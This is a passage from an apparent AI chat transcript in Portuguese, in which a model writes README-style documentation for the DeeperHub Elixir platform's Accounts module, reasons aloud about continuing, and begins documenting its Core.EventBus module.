## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento do Ciclo de Vida do Usu√°rio:**
    *   Cria√ß√£o de novas contas de usu√°rio (`create_user/1`).
    *   Registro completo de usu√°rio com perfil (`register_user/1`).
    *   Busca de usu√°rios por ID (`get_user/1`) ou email (`get_user_by_email/1`).
    *   Listagem de usu√°rios com filtros e pagina√ß√£o (`list_users/1`).
    *   Contagem de usu√°rios ativos, bloqueados e registros recentes (via `DeeperHub.Accounts.AccountManager` ou `DeeperHub.Accounts.Services.UserService`).
*   **Autentica√ß√£o de Usu√°rio (Delega√ß√£o):**
    *   Autentica√ß√£o com email e senha (`authenticate/5`).
    *   In√≠cio do processo de autentica√ß√£o WebAuthn (`begin_webauthn_authentication/1`).
    *   Verifica√ß√£o de segundo fator de autentica√ß√£o (`verify_second_factor/4`).
*   **Gerenciamento de Perfil do Usu√°rio:**
    *   Cria√ß√£o de perfis de usu√°rio (`create_profile/2`).
    *   Obten√ß√£o de perfis de usu√°rio (`get_profile/1`).
    *   Atualiza√ß√£o de perfis de usu√°rio (`update_profile/2`).
    *   Gerenciamento de prefer√™ncias de notifica√ß√£o (via `DeeperHub.Accounts.AccountManager`).
    *   Formata√ß√£o de nomes e c√°lculo de idade (via `DeeperHub.Accounts.Profile`).
*   **Gerenciamento de Senha (Delega√ß√£o):**
    *   Atualiza√ß√£o de senha do usu√°rio (`update_password/3`).
*   **Verifica√ß√£o de Email (Delega√ß√£o):**
    *   Confirma√ß√£o de endere√ßo de email (`confirm_email/2`).
    *   Reenvio de email de verifica√ß√£o (`resend_verification_email/1`).
*   **Gerenciamento de Sess√µes (Delega√ß√£o):**
    *   Limpeza de sess√µes expiradas (`cleanup_sessions/0`).
*   **Feature Flags Espec√≠ficas de Contas:**
    *   Verifica√ß√£o de flags como `registration_enabled?`, `email_verification_enabled?` (via `DeeperHub.Accounts.FeatureFlags`).
*   **Integra√ß√£o de Eventos:**
    *   Publica√ß√£o de eventos como `user_created`, `user_updated`, `email_verified` (via `DeeperHub.Accounts.Integrations.EventIntegration`).

## üèóÔ∏è 3. Arquitetura e Design

O m√≥dulo `DeeperHub.Accounts` atua como uma **Fachada (Facade)**, simplificando a interface para um conjunto complexo de subsistemas e servi√ßos relacionados a contas. Ele delega as responsabilidades para m√≥dulos de servi√ßo mais espec√≠ficos, como:

*   `DeeperHub.Accounts.Services.UserService`: Lida com opera√ß√µes CRUD de usu√°rios.
*   `DeeperHub.Accounts.Services.ProfileService`: Gerencia perfis de usu√°rios.
*   `DeeperHub.Auth.Services.AuthService` (via delega√ß√£o): Lida com autentica√ß√£o.
*   `DeeperHub.Auth.Services.PasswordService` (via delega√ß√£o): Gerencia senhas.
*   `DeeperHub.Accounts.Services.RegistrationService`: Orquestra o processo de registro.
*   `DeeperHub.Accounts.Services.SessionCleanupWorker`: Limpeza de sess√µes.
*   `DeeperHub.Accounts.Services.EmailVerificationWorker`: Gerencia verifica√ß√£o de email.
*   `DeeperHub.Accounts.FeatureFlags`: Consulta feature flags.
*   `DeeperHub.Accounts.Integrations.EventIntegration`: Publica eventos de dom√≠nio.
*   `DeeperHub.Core.EventBus`: Para publica√ß√£o de eventos.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.

A estrutura de diret√≥rios t√≠pica seria:

```
lib/deeper_hub/accounts/
‚îú‚îÄ‚îÄ accounts.ex             # Fachada Principal
‚îú‚îÄ‚îÄ feature_flags.ex
‚îú‚îÄ‚îÄ profile.ex              # L√≥gica do Profile Struct (se n√£o for s√≥ schema)
‚îú‚îÄ‚îÄ session.ex              # L√≥gica de Sess√£o (se n√£o for s√≥ schema/manager)
‚îú‚îÄ‚îÄ user.ex                 # L√≥gica do User Struct (se n√£o for s√≥ schema)
‚îÇ
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îî‚îÄ‚îÄ event_integration.ex
‚îÇ
‚îú‚îÄ‚îÄ schema/
‚îÇ   ‚îú‚îÄ‚îÄ profile.ex
‚îÇ   ‚îú‚îÄ‚îÄ session.ex
‚îÇ   ‚îî‚îÄ‚îÄ user.ex
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ user_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ profile_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ registration_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ email_verification_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ session_cleanup_worker.ex
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex
```

### 3.1. Componentes Principais

*   **`DeeperHub.Accounts` (Este m√≥dulo):** Ponto de entrada para todas as funcionalidades de contas.
*   **`DeeperHub.Accounts.Services.UserService`:** L√≥gica de neg√≥cio para usu√°rios.
*   **`DeeperHub.Accounts.Services.ProfileService`:** L√≥gica de neg√≥cio para perfis.
*   **`DeeperHub.Accounts.Services.RegistrationService`:** Orquestra o fluxo de registro de novos usu√°rios.
*   **`DeeperHub.Accounts.Schema.User`:** Schema Ecto para a entidade Usu√°rio.
*   **`DeeperHub.Accounts.Schema.Profile`:** Schema Ecto para a entidade Perfil.
*   **`DeeperHub.Accounts.Schema.Session`:** Schema Ecto para a entidade Sess√£o.
*   **`DeeperHub.Accounts.Integrations.EventIntegration`:** Publica eventos de dom√≠nio significativos para o `Core.EventBus`.
*   **`DeeperHub.Accounts.FeatureFlags`:** Verifica flags de funcionalidades espec√≠ficas de contas.
*   **`DeeperHub.Accounts.Supervisor`:** Supervisiona os workers e GenServers do m√≥dulo Accounts.
*   **Workers (`EmailVerificationWorker`, `SessionCleanupWorker`):** Processos GenServer para tarefas ass√≠ncronas.

### 3.3. Decis√µes de Design Importantes

*   **Fachada Expl√≠cita:** O uso de `DeeperHub.Accounts` como fachada √∫nica para o exterior promove baixo acoplamento e clareza sobre o ponto de entrada do m√≥dulo.
*   **Servi√ßos Especializados:** A divis√£o das responsabilidades em servi√ßos menores (`UserService`, `ProfileService`, etc.) facilita a manuten√ß√£o e o teste de unidades de l√≥gica espec√≠ficas.
*   **Separa√ß√£o de Schema e L√≥gica:** Manter Schemas Ecto separados da l√≥gica de servi√ßo ajuda a manter o c√≥digo organizado.
*   **Workers para Tarefas Ass√≠ncronas:** O uso de GenServers para tarefas como limpeza de sess√£o e envio de emails de verifica√ß√£o melhora a responsividade das opera√ß√µes s√≠ncronas.
*   **Delega√ß√£o para `DeeperHub.Auth`:** Funcionalidades puras de autentica√ß√£o (verifica√ß√£o de senha, MFA, etc.) s√£o delegadas ao m√≥dulo `DeeperHub.Auth`, mantendo o `Accounts` focado no ciclo de vida e dados do usu√°rio.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Registro de Novo Usu√°rio:** Um visitante se cadastra na plataforma. O `DeeperHub.Accounts` recebe os dados, utiliza o `RegistrationService` para criar o usu√°rio e o perfil, e potencialmente dispara um email de verifica√ß√£o.
*   **Login de Usu√°rio:** Um usu√°rio tenta se logar. `DeeperHub.Accounts` delega para `DeeperHub.Auth` para verificar as credenciais e, se bem-sucedido, gerencia a cria√ß√£o da sess√£o.
*   **Atualiza√ß√£o de Perfil:** Um usu√°rio logado atualiza suas informa√ß√µes de perfil. `DeeperHub.Accounts` usa o `ProfileService` para validar e persistir as altera√ß√µes.
*   **Confirma√ß√£o de Email:** Um usu√°rio clica no link de confirma√ß√£o. `DeeperHub.Accounts` usa o `UserService` (ou `EmailVerificationService`) para validar o token e marcar o email como confirmado.
*   **Administrador Lista Usu√°rios:** Um administrador consulta a lista de usu√°rios. `DeeperHub.Accounts` usa o `UserService` para buscar e paginar os usu√°rios.

## üåä 5. Fluxos Importantes (Opcional)

**Fluxo de Registro de Novo Usu√°rio (`register_user/1`):**

1.  `DeeperHub.Accounts.register_user/1` √© chamado com os atributos do usu√°rio e perfil.
2.  A chamada √© delegada para `DeeperHub.Accounts.Services.RegistrationService.register/1`.
3.  `RegistrationService` primeiro chama `DeeperHub.Accounts.Services.UserService.create_user/1` para criar a entidade `User`.
    *   Valida√ß√µes s√£o aplicadas no `User.changeset`.
    *   Senha √© hasheada.
    *   Usu√°rio √© persistido.
4.  Se a cria√ß√£o do usu√°rio for bem-sucedida, `RegistrationService` chama `DeeperHub.Accounts.Services.ProfileService.create_profile/2` para criar o perfil associado.
    *   Valida√ß√µes s√£o aplicadas no `Profile.changeset`.
    *   Perfil √© persistido.
5.  `RegistrationService` emite um evento `UserRegisteredEvent` (ou `UserCreatedEvent`) atrav√©s de `DeeperHub.Accounts.Integrations.EventIntegration` para o `Core.EventBus`.
6.  Se a verifica√ß√£o de email estiver habilitada (`FeatureFlags.email_verification_enabled?/1`), uma tarefa para enviar o email de verifica√ß√£o √© enfileirada (possivelmente via `EmailVerificationWorker`).
7.  Retorna `{:ok, %{user: user, profile: profile}}` ou `{:error, reason}`.

## üì° 6. API (Se Aplic√°vel)

Este m√≥dulo exp√µe uma API Elixir para ser consumida por outros m√≥dulos dentro do DeeperHub.

### 6.1. `DeeperHub.Accounts.register_user/1`

*   **Descri√ß√£o:** Registra um novo usu√°rio com informa√ß√µes de usu√°rio e perfil.
*   **`@spec`:** `register_user(attrs :: map()) :: {:ok, %{user: User.t(), profile: Profile.t()}} | {:error, Ecto.Changeset.t() | term()}`
*   **Par√¢metros:**
    *   `attrs` (map): Um mapa contendo chaves para os atributos do usu√°rio (ex: `:email`, `:password`) e uma chave `:profile` com os atributos do perfil (ex: `:full_name`).
*   **Retorno:**
    *   `{:ok, %{user: user, profile: profile}}`: Em caso de sucesso, retorna o usu√°rio e perfil criados.
    *   `{:error, changeset}`: Se houver falha na valida√ß√£o dos dados.
    *   `{:error, reason}`: Para outros erros internos.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    attrs = %{
      email: \"novo@exemplo.com\",
      password: \"Senha@123\",
      profile: %{full_name: \"Novo Usu√°rio\"}
    }
    case DeeperHub.Accounts.register_user(attrs) do
      {:ok, %{user: user, profile: profile}} -> Logger.info(\"Usu√°rio #{user.email} registrado com perfil #{profile.id}\")
      {:error, reason} -> Logger.error(\"Falha no registro: #{inspect(reason)}\")
    end
    ```

### 6.2. `DeeperHub.Accounts.authenticate/5`

*   **Descri√ß√£o:** Autentica um usu√°rio com email e senha, gerenciando o in√≠cio da sess√£o.
*   **`@spec`:** `authenticate(email :: String.t(), password :: String.t(), ip_address :: String.t() | nil, user_agent :: String.t() | nil, geo_data :: map() | nil) :: {:ok, %{user: User.t(), session: Session.t(), token: String.t()}} | {:error, atom()}`
*   **Par√¢metros:**
    *   `email` (String): O email do usu√°rio.
    *   `password` (String): A senha do usu√°rio.
    *   `ip_address` (String | nil): O endere√ßo IP do cliente.
    *   `user_agent` (String | nil): O User-Agent do cliente.
    *   `geo_data` (map | nil): Dados geogr√°ficos da requisi√ß√£o.
*   **Retorno:**
    *   `{:ok, %{user: user, session: session, token: token}}`: Em caso de sucesso.
    *   `{:error, :invalid_credentials}`: Se as credenciais forem inv√°lidas.
    *   `{:error, :user_locked}`: Se a conta estiver bloqueada.
    *   `{:error, :mfa_required}`: Se MFA for necess√°rio para completar o login.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    case DeeperHub.Accounts.authenticate(\"user@example.com\", \"password123\", \"127.0.0.1\", \"MyApp/1.0\", nil) do
      {:ok, auth_data} -> Logger.info(\"Usu√°rio #{auth_data.user.id} autenticado.\")
      {:error, reason} -> Logger.error(\"Falha na autentica√ß√£o: #{reason}\")
    end
    ```
    *(...documentar outras fun√ß√µes p√∫blicas importantes como `get_user/1`, `update_profile/2`, etc.)*

## ‚öôÔ∏è 7. Configura√ß√£o

O m√≥dulo `Accounts` e seus subm√≥dulos podem ser configurados atrav√©s do `DeeperHub.Core.ConfigManager`.

*   **ConfigManager:**
    *   `[:accounts, :registration, :default_role]`: Papel padr√£o atribu√≠do a novos usu√°rios. (Padr√£o: `\"user\"`)
    *   `[:accounts, :profile, :max_bio_length]`: Comprimento m√°ximo da biografia do usu√°rio. (Padr√£o: `500`)
    *   `[:accounts, :profile, :avatar_storage_path]`: Caminho base para armazenamento de avatares (se local). (Padr√£o: `\"uploads/avatars\"`)
    *   `[:accounts, :email_verification, :token_ttl_hours]`: Tempo de vida (em horas) do token de verifica√ß√£o de email. (Padr√£o: `24`)
    *   `[:accounts, :session, :cleanup_interval_minutes]`: Intervalo (em minutos) para o worker de limpeza de sess√µes. (Padr√£o: `60`)
    *   **Feature Flags (via `DeeperHub.Accounts.FeatureFlags` que usa `ConfigManager`):**
        *   `[:accounts, :feature_flags, :registration_enabled]`: (Boolean) Habilita/desabilita o registro de novos usu√°rios. (Padr√£o: `true`)
        *   `[:accounts, :feature_flags, :email_verification_enabled]`: (Boolean) Requer verifica√ß√£o de email para novos registros. (Padr√£o: `true`)
        *   `[:accounts, :feature_flags, :social_login_enabled, :google]`: (Boolean) Habilita login com Google. (Padr√£o: `false`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para acesso a configura√ß√µes.
*   `DeeperHub.Core.EventBus`: Para publica√ß√£o de eventos de dom√≠nio.
*   `DeeperHub.Core.Logger`: Para logging estruturado.
*   `DeeperHub.Core.Repo`: Para persist√™ncia de dados.
*   `DeeperHub.Auth`: Para funcionalidades de autentica√ß√£o e gerenciamento de senhas e sess√µes.
*   `DeeperHub.Notifications` (indireta): Atrav√©s de eventos, para enviar emails de verifica√ß√£o, etc.
*   `DeeperHub.Shared.Utils`: Para utilit√°rios diversos.

### 8.2. Bibliotecas Externas

*   `Ecto`: Para intera√ß√µes com o banco de dados e defini√ß√µes de schema.
*   `Comeonin` ou `Argon2` (ou similar, via `DeeperHub.Auth`): Para hashing de senhas.
*   `Jason`: Para serializa√ß√£o/deserializa√ß√£o JSON (se houver APIs REST diretas ou para metadados de eventos).

## ü§ù 9. Como Usar / Integra√ß√£o

Outros m√≥dulos devem interagir com as funcionalidades de contas exclusivamente atrav√©s da fachada `DeeperHub.Accounts`.

**Exemplo de cria√ß√£o de um novo usu√°rio:**
```elixir
attrs = %{
  email: \"test@example.com\",
  password: \"StrongPassword123!\",
  profile: %{full_name: \"Test User\"}
}
case DeeperHub.Accounts.register_user(attrs) do
  {:ok, %{user: user, profile: _profile}} ->
    IO.puts(\"Usu√°rio criado: #{user.id}\")
  {:error, changeset} ->
    IO.puts(\"Erro ao criar usu√°rio: #{inspect(changeset.errors)}\")
  {:error, reason} ->
    IO.puts(\"Erro interno: #{inspect(reason)}\")
end
```

**Exemplo de busca de perfil de usu√°rio:**
```elixir
case DeeperHub.Accounts.get_profile(user_id) do
  {:ok, profile} ->
    IO.inspect(profile)
  {:error, :not_found} ->
    IO.puts(\"Perfil n√£o encontrado.\")
  {:error, reason} ->
    IO.puts(\"Erro ao buscar perfil: #{inspect(reason)}\")
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios e de integra√ß√£o para o m√≥dulo `Accounts` e seus servi√ßos est√£o localizados em `test/deeper_hub/accounts/`.
*   Para executar todos os testes do m√≥dulo: `mix test test/deeper_hub/accounts/`
*   Para executar um arquivo de teste espec√≠fico: `mix test test/deeper_hub/accounts/user_service_test.exs`
*   Para executar um teste espec√≠fico em um arquivo: `mix test test/deeper_hub/accounts/user_service_test.exs:15` (linha 15)
*   Cobertura de testes pode ser gerada com: `mix test --cover`

### 10.2. M√©tricas

O m√≥dulo `Accounts` (e seus componentes) emite m√©tricas para o `DeeperHub.Core.Metrics` para monitoramento:

*   `deeper_hub.accounts.user.created.count` (Contador): N√∫mero de usu√°rios criados.
*   `deeper_hub.accounts.user.login.success.count` (Contador): N√∫mero de logins bem-sucedidos.
*   `deeper_hub.accounts.user.login.failure.count` (Contador): N√∫mero de logins falhos.
*   `deeper_hub.accounts.profile.updated.count` (Contador): N√∫mero de perfis atualizados.
*   `deeper_hub.accounts.email.verified.count` (Contador): N√∫mero de emails verificados.
*   `deeper_hub.accounts.get_user.duration_ms` (Histograma): Dura√ß√£o da busca de usu√°rio.
*   `deeper_hub.accounts.active_users.gauge` (Gauge): N√∫mero total de usu√°rios ativos.

### 10.3. Logs

Logs gerados pelo m√≥dulo `Accounts` seguem o padr√£o do `DeeperHub.Core.Logger` e incluem automaticamente:
*   `{module: DeeperHub.Accounts}` ou o subm√≥dulo espec√≠fico (ex: `{module: DeeperHub.Accounts.Services.UserService}`).
*   `{function: \"nome_da_funcao/aridade\"}`.
*   Opera√ß√µes cr√≠ticas incluem `user_id` e `trace_id` (se aplic√°vel) para rastreamento.
    Ex: `Logger.info(\"Usu√°rio criado\", module: DeeperHub.Accounts.Services.UserService, user_id: user.id)`
    Ex: `Logger.error(\"Falha ao atualizar perfil\", module: DeeperHub.Accounts.Services.ProfileService, user_id: user.id, error: reason)`

### 10.4. Telemetria

O m√≥dulo `Accounts` emite eventos de telemetria atrav√©s de `DeeperHub.Accounts.Integrations.EventIntegration` que s√£o ent√£o manipulados pelo `Core.EventBus`. Eventos principais:

*   `[:deeper_hub, :accounts, :user, :created]`: Emitido ap√≥s um novo usu√°rio ser criado. Payload: `%{user: user_struct}`.
*   `[:deeper_hub, :accounts, :user, :updated]`: Emitido ap√≥s um usu√°rio ser atualizado. Payload: `%{user: user_struct, changes: changes_map}`.
*   `[:deeper_hub, :accounts, :user, :deleted]`: Emitido ap√≥s um usu√°rio ser deletado. Payload: `%{user_id: user_id}`.
*   `[:deeper_hub, :accounts, :profile, :updated]`: Emitido ap√≥s um perfil ser atualizado. Payload: `%{profile: profile_struct, changes: changes_map}`.
*   `[:deeper_hub, :accounts, :email, :verified]`: Emitido quando um email √© verificado. Payload: `%{user_id: user_id, email: email_string}`.
*   `[:deeper_hub, :accounts, :password, :changed]`: Emitido ap√≥s a senha de um usu√°rio ser alterada. Payload: `%{user_id: user_id}`.
*   `[:deeper_hub, :accounts, :session, :created]`: Emitido ap√≥s uma nova sess√£o ser criada (login). Payload: `%{user_id: user_id, session_id: session_id}`.
*   `[:deeper_hub, :accounts, :session, :revoked]`: Emitido ap√≥s uma sess√£o ser revogada (logout). Payload: `%{user_id: user_id, session_id: session_id}`.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes que podem falhar devido a dados inv√°lidos geralmente retornam `{:error, changeset}` com os detalhes da valida√ß√£o.
*   Erros de \"n√£o encontrado\" retornam `{:error, :not_found}`.
*   Erros de permiss√£o (embora mais comuns em `DeeperHub.Auth`) podem retornar `{:error, :unauthorized}`.
*   Outros erros internos podem retornar `{:error, term()}` com uma descri√ß√£o do erro.
*   √â esperado que os chamadores tratem esses tipos de retorno usando `case` ou `with`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Dados Sens√≠veis:** Este m√≥dulo lida com dados pessoais (nome, email) e credenciais (senhas, via delega√ß√£o para `DeeperHub.Auth`). As senhas nunca s√£o armazenadas em texto plano.
*   **Valida√ß√£o de Entrada:** Todos os dados de entrada fornecidos pelo usu√°rio s√£o rigorosamente validados usando `Ecto.Changeset` para prevenir dados malformados e ataques comuns.
*   **Hashing de Senhas:** O hashing de senhas √© delegado para `DeeperHub.Auth`, que utiliza algoritmos fortes (ex: Argon2, bcrypt).
*   **Tokens de Verifica√ß√£o:** Tokens de verifica√ß√£o de email s√£o gerados com seguran√ßa, t√™m tempo de vida limitado e s√£o de uso √∫nico.
*   **Controle de Acesso:** A modifica√ß√£o de dados de um usu√°rio (perfil, senha) √© restrita ao pr√≥prio usu√°rio ou a administradores com as devidas permiss√µes (verificado por `DeeperHub.Auth` ou `DeeperHub.RBAC`).
*   **Preven√ß√£o de Enumera√ß√£o de Usu√°rios:** Respostas a tentativas de login ou recupera√ß√£o de senha n√£o devem revelar se um email/usu√°rio existe no sistema, para dificultar a enumera√ß√£o.

## üßë‚Äçüíª 13. Contribui√ß√£o

Consulte as diretrizes gerais de contribui√ß√£o do projeto DeeperHub.
*   Mantenha a separa√ß√£o entre a fachada `DeeperHub.Accounts` e os servi√ßos internos.
*   Adicione testes para todas as novas funcionalidades e corre√ß√µes.
*   Siga os padr√µes de logging e m√©tricas estabelecidos.
*   Ao adicionar novas opera√ß√µes que alteram estado, considere emitir eventos de dom√≠nio atrav√©s de `EventIntegration`.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar gerenciamento de consentimento do usu√°rio (LGPD/GDPR).
*   [ ] Adicionar op√ß√£o para usu√°rios solicitarem a exporta√ß√£o de seus dados.
*   [ ] Integrar com um servi√ßo de enriquecimento de perfil (ex: Clearbit) opcional.
*   [ ] Permitir que usu√°rios conectem m√∫ltiplas identidades sociais √† mesma conta DeeperHub.
*   [ ] Refatorar `AccountManager` completamente para dentro dos novos servi√ßos, se ainda houver resqu√≠cios.
*   Consultar `TODO:`s no c√≥digo para tarefas pendentes.

---

*√öltima atualiza√ß√£o: 2025-05-10*

---

Isso √© um exemplo para um m√≥dulo. O processo seria repetido para cada um dos m√≥dulos identificados na nova estrutura, detalhando ao m√°ximo suas caracter√≠sticas.

Espero que esta an√°lise e o exemplo de README ajudem a estruturar a documenta√ß√£o do seu novo sistema DeeperHub! √â um projeto ambicioso e com uma base j√° muito s√≥lida."""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""perfeito, continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""O usu√°rio pediu para \"continuar\". Isso significa que devo prosseguir com a tarefa de detalhar os m√≥dulos do sistema DeeperHub, seguindo o template de README fornecido e incorporando as melhorias e novas funcionalidades que sugeri anteriormente.

Minha estrat√©gia ser√°:

1.  **Revisitar a lista de m√≥dulos propostos** na minha resposta anterior, especialmente os do `Core` e os principais m√≥dulos de aplica√ß√£o/dom√≠nio.
2.  **Para cada m√≥dulo significativo**, vou criar um arquivo README (mentalmente, neste caso, ou como uma se√ß√£o separada na resposta).
3.  **Preencher cada se√ß√£o do template** para o m√≥dulo em quest√£o, baseando-me nas funcionalidades existentes (conforme o `modules_documentation.txt`) e adicionando as novas funcionalidades e integra√ß√µes que sugeri.
4.  **Focar em detalhar TUDO**, conforme a instru√ß√£o original: responsabilidades, funcionalidades chave, arquitetura interna (componentes, intera√ß√µes), APIs (fun√ß√µes p√∫blicas e/ou endpoints REST), configura√ß√£o, depend√™ncias, testes, observabilidade, tratamento de erros, seguran√ßa, e melhorias futuras.
5.  **Priorizar os m√≥dulos Core primeiro**, pois eles s√£o a base para os outros.
6.  **Depois, abordar os m√≥dulos de aplica√ß√£o/dom√≠nio mais cr√≠ticos** ou aqueles que tiveram mais informa√ß√µes no arquivo `modules_documentation.txt` para ter uma base s√≥lida.

Vou come√ßar com um m√≥dulo Core fundamental, como o `DeeperHub.Core.EventBus`, pois muitos outros m√≥dulos depender√£o dele. Depois, talvez o `DeeperHub.Core.ConfigManager` ou `DeeperHub.Core.Logger`.

**Lembretes importantes das instru√ß√µes do usu√°rio:**
*   Categorizar, especificar e criar arquivos README.
*   Organizar, especificar e categorizar o m√°ximo *todas* as caracter√≠sticas e itens.
*   Sempre especificar TUDO!
*   Manter a linguagem em Portugu√™s (BR) e o uso de emojis üòä.
*   Adicionar novas funcionalidades que achar necess√°rio para um sistema s√≥lido em produ√ß√£o.
*   Detalhar a integra√ß√£o dos m√≥dulos entre si.

Vamos come√ßar com `DeeperHub.Core.EventBus`.

---
**Rascunho mental para `DeeperHub.Core.EventBus`:**

*   **1. Vis√£o Geral:** Sistema centralizado para publica√ß√£o e assinatura de eventos, permitindo comunica√ß√£o ass√≠ncrona e desacoplada. Baseado no `Elixir.DeeperHub.Core.Event.EventBus` e `Elixir.DeeperHub.Core.Event`.
*   **2. Responsabilidades e Funcionalidades:**
    *   Registrar assinantes para t√≥picos de eventos.
    *   Receber eventos publicados por outros m√≥dulos.
    *   Distribuir eventos para os assinantes corretos.
    *   Gerenciar a l√≥gica de retry para entrega de eventos (se habilitado).
    *   Manter um hist√≥rico de eventos recentes (se habilitado).
    *   Suporte a t√≥picos com wildcards.
*   **3. Arquitetura e Design:**
    *   Componente Principal: `EventBus.Server` (GenServer) que gerencia assinaturas e a fila de eventos.
    *   Componente Auxiliar: `EventBus.Dispatcher` (poderia ser um `Task.Supervisor` ou workers dedicados) para enviar eventos aos assinantes, permitindo concorr√™ncia e isolamento de falhas de assinantes.
    *   Padr√£o: Pub/Sub.
    *   Armazenamento (Opcional, para persist√™ncia/hist√≥rico): ETS para assinaturas e eventos em tr√¢nsito; talvez Mnesia ou um banco de dados para hist√≥rico de eventos persistente.
    *   A l√≥gica de retry pode envolver uma fila separada e um worker para reprocessamento.
*   **4. Casos de Uso:**
    *   `Accounts` publica `UserCreatedEvent` -> `Notifications` assina e envia email de boas-vindas.
    *   `Security` publica `SuspiciousLoginAttemptEvent` -> `Audit` assina e loga, `RiskManagement` assina e avalia.
*   **5. Fluxos Importantes:**
    *   Fluxo de Publica√ß√£o: M√≥dulo X chama `EventBus.publish/3` -> `EventBus.Server` recebe, identifica assinantes -> Eventos s√£o enfileirados para `EventBus.Dispatcher`.
    *   Fluxo de Assinatura: M√≥dulo Y chama `EventBus.subscribe/2` -> `EventBus.Server` registra o PID/nome do assinante para o t√≥pico.
    *   Fluxo de Dispatch: `EventBus.Dispatcher` pega evento da fila -> Envia para cada assinante -> Lida com sucesso/falha (retry).
*   **6. API (Fun√ß√µes P√∫blicas):**
    *   `publish(topic, payload, opts)`
    *   `subscribe(topic, subscriber_pid_or_name, opts)`
    *   `unsubscribe(topic, subscriber_pid_or_name)`
    *   `unsubscribe_all(subscriber_pid_or_name)`
    *   `get_event_history(topic, opts)` (Nova funcionalidade)
    *   `get_subscriber_count(topic)` (Nova funcionalidade)
*   **7. Configura√ß√£o:**
    *   `[:core, :event_bus, :history_limit_per_topic]`
    *   `[:core, :event_bus, :retry_enabled]`
    *   `[:core, :event_bus, :retry_max_attempts]`
    *   `[:core, :event_bus, :retry_base_interval_ms]`
    *   `[:core, :event_bus, :retry_max_interval_ms]`
    *   `[:core, :event_bus, :dispatcher_pool_size]` (Nova)
    *   `[:core, :event_bus, :persistent_storage_adapter]` (Nova, para hist√≥rico persistente)
*   **8. Depend√™ncias:**
    *   Internas: `Core.Logger`, `Core.Metrics`, `Core.ConfigManager`.
    *   Externas: Nenhuma direta fundamental, mas pode usar `Jason` para serializa√ß√£o de payloads se forem para armazenamento externo.
*   **9. Como Usar / Integra√ß√£o:**
    *   Publicadores: `DeeperHub.Core.EventBus.publish(\"user.created\", %{user_id: 123})`
    *   Assinantes: No `init` de um GenServer: `DeeperHub.Core.EventBus.subscribe(\"user.created\", self())` e implementar `handle_info({:event, topic, payload}, state)`.
*   **10. Testes e Observabilidade:**
    *   M√©tricas: `events.published.count`, `events.delivered.count`, `events.failed.count`, `events.retried.count`, `queue_size.gauge`, `subscriber_count.gauge`.
    *   Logs: Atividade de publica√ß√£o, dispatch, falhas de entrega, retries.
    *   Telemetria: Eventos Telemetry para cada etapa do ciclo de vida de um evento.
*   **11. Tratamento de Erros:**
    *   Falha de assinante n√£o deve impedir outros.
    *   L√≥gica de retry para entregas. Dead-letter queue para falhas persistentes.
*   **12. Considera√ß√µes de Seguran√ßa:**
    *   Payloads de eventos n√£o devem conter dados excessivamente sens√≠veis n√£o criptografados se houver persist√™ncia.
    *   Autentica√ß√£o/Autoriza√ß√£o de quem pode publicar/assinar quais t√≥picos (mais avan√ßado, talvez n√£o para v1).
*   **13. Contribui√ß√£o:** Padr√µes para nomea√ß√£o de t√≥picos (ex: `dominio.entidade.acao`).
*   **14. Melhorias Futuras:**
    *   Persist√™ncia de eventos em disco/DB.
    *   Dead-letter queue (DLQ) para eventos que falham consistentemente.
    *   Event Sourcing como um padr√£o mais amplo na aplica√ß√£o.
    *   Filtragem de eventos no lado do assinante.

---

Continuarei com o m√≥dulo `DeeperHub.Core.EventBus` como primeiro exemplo."""),
                types.Part.from_text(text="""Ok, vamos continuar construindo a documenta√ß√£o detalhada para os m√≥dulos do novo sistema DeeperHub.

Come√ßaremos com um dos m√≥dulos centrais, o `DeeperHub.Core.EventBus`, essencial para a comunica√ß√£o desacoplada entre diferentes partes do sistema.

---

# M√≥dulo: `DeeperHub.Core.EventBus` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.EventBus`

O m√≥dulo `DeeperHub.Core.EventBus` √© o cora√ß√£o do sistema de publica√ß√£o e assinatura de eventos (Pub/Sub) dentro do DeeperHub. Ele permite que diferentes m√≥dulos da aplica√ß√£o se comuniquem de forma ass√≠ncrona e desacoplada, emitindo eventos quando ocorrem a√ß√µes significativas e permitindo que outros m√≥dulos interessados reajam a esses eventos sem conhecimento direto uns dos outros. Isso promove uma arquitetura mais modular, extens√≠vel e resiliente. üòä

Exemplo: Quando um novo usu√°rio √© criado pelo m√≥dulo `DeeperHub.Accounts`, ele publica um evento `UserCreatedEvent`. O m√≥dulo `DeeperHub.Notifications` pode estar inscrito nesse evento para enviar um email de boas-vindas, e o m√≥dulo `DeeperHub.Audit` pode registrar o evento para fins de auditoria.

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Registro de Assinantes (Subscribers):**
    *   Permitir que m√≥dulos ou processos registrem interesse em t√≥picos de eventos espec√≠ficos.
    *   Suporte a t√≥picos com wildcards para assinaturas mais flex√≠veis (ex: `user.*`, `payment.success`).
    *   Gerenciar o ciclo de vida das assinaturas, incluindo remo√ß√£o autom√°tica de assinantes que terminam.
*   **Publica√ß√£o de Eventos (Publishers):**
    *   Receber eventos de qualquer m√≥dulo do sistema.
    *   Validar (opcionalmente) o formato do evento e do payload.
*   **Distribui√ß√£o de Eventos:**
